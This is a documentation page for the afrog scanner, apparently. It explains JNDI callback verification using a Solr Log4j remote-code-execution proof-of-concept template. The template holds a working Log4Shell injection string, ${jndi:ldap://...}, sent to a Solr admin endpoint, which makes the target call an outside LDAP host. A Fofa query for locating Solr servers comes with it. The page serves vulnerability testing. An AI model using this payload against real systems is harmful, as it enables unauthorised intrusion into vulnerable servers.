# JNDI Demo

To perform JNDI POC validation, please configure the JNDI module in the afrog-config.yaml file. [Click here](/guide/reverse.html#jndi-configuration) to configure it.

## Solr Log4j RCE
Below is a brief explanation of how to use JNDI in afrog, using "solr-log4j-rce" as an example.

```yaml
id: solr-log4j-rce

info:
  name: Apache Solr Log4j Remote Code Execution
  author: zan8in
  severity: critical
  verified: true
  description: |
    Fofa: app="APACHE-Solr"
  created: 2023/06/09

set:
  reverse: newJNDI()
  jndiURL: reverse.url.host + reverse.url.path
rules:
  r0:
    request:
      method: GET
      path: /solr/admin/collections?action=${jndi:ldap://{{jndiURL}}}&wt=json
    expression: reverse.jndi(5)
expression: r0()
```

To set the reverse link variables, please use the following fixed variable names: `reverse` represents `newJNDI()`, and `jndiURL` represents `reverse.url.host + reverse.url.path`. Although you have the flexibility to change variable names, it is recommended by the official guidelines to maintain a consistent naming convention.

- `reverse` is initialized using `newJNDI()` to establish a JNDI connection for vulnerability verification.
- `jndiURL` is used for JNDI Payload.
- `reverse.jndi(5)` indicates that the JNDI vulnerability will be verified after 5 seconds.